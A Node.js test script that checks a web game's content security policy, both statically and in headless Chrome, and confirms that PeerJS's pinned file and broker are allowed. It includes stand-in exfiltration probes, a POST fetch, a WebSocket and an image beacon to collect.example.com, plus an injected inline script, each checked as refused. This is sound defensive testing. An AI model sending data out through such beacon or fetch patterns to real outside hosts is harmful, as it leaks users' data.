#!/usr/bin/env node
// Checks the page's content security policy (the meta in index.html; SECURITY.md, point 7): code only from this
// site, the page's own inline scripts by their hashes, and PeerJS's pinned file (net.js's PEERJS); contact only
// this site and PeerJS's broker. First the policy as written, then in headless Chrome (tools/browser.js): the page
// starts and plays with nothing refused, while code or contact from anywhere else is refused. That the real PeerJS
// file and broker work under it is shown by an online round on the PR's preview, not here (no network in a suite).
//
//   node tools/csp-test.js
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { launch, serve, reporter } = require('./browser');
const root = path.join(__dirname, '..');
const report = reporter(), { results, check } = report;

const html = fs.readFileSync(path.join(root, 'index.html'), 'utf8');
const PEERJS = fs.readFileSync(path.join(root, 'net.js'), 'utf8').match(/const PEERJS = '([^']+)'/)[1];
const BROKER = ['https://0.peerjs.com', 'wss://0.peerjs.com']; // (PeerJS's own broker: net.js names no other host)

// The policy as written.
const metas = [...html.matchAll(/<meta http-equiv="Content-Security-Policy" content="([^"]*)">/gi)];
check(metas.length === 1, 'index.html has one content security policy', `${metas.length} found`);
const at = metas[0]?.index ?? Infinity;
const first = html.search(/<script|<link rel="stylesheet"|<style/);
check(at < first, 'it comes before every script and stylesheet (a policy governs only what follows it)');
const policy = Object.fromEntries((metas[0]?.[1] || '').split(';').map(d => d.trim().split(/\s+/)).filter(d => d[0]).map(([k, ...v]) => [k, v]));
const same = (a = [], b) => a.length === b.length && b.every(x => a.includes(x));
check(same(policy['default-src'], ["'none'"]), "default-src is 'none': whatever it doesn't name is refused", policy['default-src']?.join(' '));

const inline = [...html.matchAll(/<script>([\s\S]*?)<\/script>/g)].map(m => `'sha256-${crypto.createHash('sha256').update(m[1]).digest('base64')}'`);
const scripts = policy['script-src'] || [];
const hashes = scripts.filter(s => s.startsWith("'sha"));
const others = scripts.filter(s => !s.startsWith("'sha"));
check(same(others, ["'self'", PEERJS]), "script-src names only 'self' and net.js's PEERJS, exactly", others.join(' '));
check(same(hashes, inline), "script-src holds the hash of every inline script, and no other",
  same(hashes, inline) ? '' : `in the policy, put: ${inline.join(' ')}`);
check(same(policy['connect-src'], ["'self'", ...BROKER]), "connect-src names only 'self' and PeerJS's broker", policy['connect-src']?.join(' '));
check(!/'unsafe-eval'|'unsafe-hashes'|'strict-dynamic'/.test(metas[0]?.[1] || ''), 'nothing lets code be built from text');
check(!Object.entries(policy).some(([k, v]) => k !== 'style-src' && v.includes("'unsafe-inline'")), "'unsafe-inline' only for styles (the markup's style attributes)");
check(!Object.entries(policy).some(([k, v]) => k !== 'img-src' && k !== 'child-src' && v.some(s => /^(\*|https?:|wss?:|data:|blob:)$/.test(s))),
  'no wildcard or whole scheme, except data: images and the blob: worker (keepTimeWhileHidden in game/core.js)');
check(!/<[a-z][^>]*\son[a-z]+=/i.test(html), 'no inline event handler in index.html (the policy refuses them)');
const loaded = [...html.matchAll(/<script src="([^"]+)"/g)].map(m => m[1]);
const building = loaded.filter(f => /\beval\(|new Function\b|set(Timeout|Interval)\(\s*['"`]/.test(fs.readFileSync(path.join(root, f), 'utf8')));
check(!building.length, 'no script the page loads builds code from text (SECURITY.md, point 6; the policy refuses it)', building.join(', '));

// In the browser: every refusal the page meets is counted.
const WATCH = `window.__refused = []; addEventListener('securitypolicyviolation', e => __refused.push(e.effectiveDirective + ' ' + e.blockedURI));`;
(async () => {
  const site = await serve();
  const b = await launch();
  const { ev } = b;
  try {
    await b.send('Page.addScriptToEvaluateOnNewDocument', { source: WATCH });
    await b.viewport(1000, 800);
    // Requests to PeerJS's file and broker are answered here as failed, never sent: what's checked is only that the
    // policy lets them out of the page.
    const asked = [];
    await b.send('Fetch.enable', { patterns: [{ urlPattern: 'https://cdnjs.cloudflare.com/*' }, { urlPattern: 'https://0.peerjs.com/*' }] });
    b.on('Fetch.requestPaused', p => { asked.push(p.request.url); b.send('Fetch.failRequest', { requestId: p.requestId, errorReason: 'InternetDisconnected' }).catch(() => {}); });

    await b.go(site.url + '?debug', { settle: 600 });
    check(await ev(`window.snakeBrowserOk === true && !/newer browser/.test(document.getElementById('overlay-title').textContent)`),
      'the page takes this browser as new enough (its check runs under the policy)');
    check(await ev(`Promise.race([navigator.serviceWorker.ready.then(() => true), new Promise(r => setTimeout(r, 5000, false))])`), 'the service worker starts');
    await ev(`document.getElementById('watch').click(), SnakeDebug.frames(80), 'ok'`);
    check(await ev(`SnakeDebug.state() === 'running' && SnakeDebug.game().tick > 0`), 'a round plays');
    check(await ev(`keepTimeWhileHidden(true), !!hiddenClock`), "a hidden host's clock starts (a blob: worker)");
    await ev(`new Promise(r => { hiddenClock.onmessage = () => r(); setTimeout(r, 1000); }).then(() => keepTimeWhileHidden(false))`);
    check(await ev(`JSON.stringify(__refused)`) === '[]', 'nothing the page does is refused', await ev(`__refused.join('; ')`));

    // What the policy lets out: PeerJS's pinned file, and its broker.
    await ev(`(() => { const s = document.createElement('script'); s.src = ${JSON.stringify(PEERJS)}; document.head.append(s); fetch('https://0.peerjs.com/peerjs/id').catch(() => {}); return 'ok'; })()`);
    await b.sleep(500);
    check(asked.includes(PEERJS) && asked.some(u => u.startsWith('https://0.peerjs.com/')), "PeerJS's file and broker are let through", asked.join(', '));
    check(await ev(`(() => { const w = new WebSocket('wss://0.peerjs.com/peerjs'); w.close(); return __refused.length === 0; })()`), "PeerJS's broker's socket is let through");

    // What it refuses.
    const refused = async (what, js, directive) => {
      await ev(`__refused.length = 0, 'ok'`);
      const ran = await ev(js);
      await b.sleep(200);
      const got = await ev(`__refused.join('; ')`);
      check(!ran && got.includes(directive), `refused: ${what}`, `ran: ${ran}; refused: ${got || 'nothing'}`);
    };
    await refused('an inline script added to the page', `(() => { const s = document.createElement('script'); s.textContent = 'window.__ran = 1'; document.head.append(s); return !!window.__ran; })()`, 'script-src');
    await refused('code built from text', `new Promise(r => setTimeout(() => { try { eval('1'); r(true); } catch { r(false); } }))`, 'script-src');
    await refused('a script from another site', `new Promise(r => { const s = document.createElement('script'); s.src = 'https://cdn.example.com/x.js'; s.onload = () => r(true); s.onerror = () => r(false); document.head.append(s); })`, 'script-src');
    await refused('another of PeerJS\'s versions from the same site', `new Promise(r => { const s = document.createElement('script'); s.src = 'https://cdnjs.cloudflare.com/ajax/libs/peerjs/1.5.4/peerjs.min.js'; s.onload = () => r(true); s.onerror = () => r(false); document.head.append(s); })`, 'script-src');
    await refused('sending to another site', `fetch('https://collect.example.com/?d=1', { method: 'POST', body: 'x' }).then(() => true, () => false)`, 'connect-src');
    await refused('a socket to another site', `(() => { try { new WebSocket('wss://collect.example.com/'); } catch {} return false; })()`, 'connect-src');
    await refused('an image from another site (a way to send)', `new Promise(r => { const i = new Image(); i.onload = () => r(true); i.onerror = () => r(false); i.src = 'https://collect.example.com/p.gif?d=1'; })`, 'img-src');

    console.log(results.join('\n'));
    if (b.errors.length) { console.log('page errors:', b.errors); report.failed++; }
  } finally {
    await b.close();
    site.close();
  }
  if (report.failed) { console.error(`\n${report.failed} failed`); process.exit(1); }
  console.log(`\nall passed (${results.length} checks)`);
})().catch(e => { console.error(e); process.exit(1); });
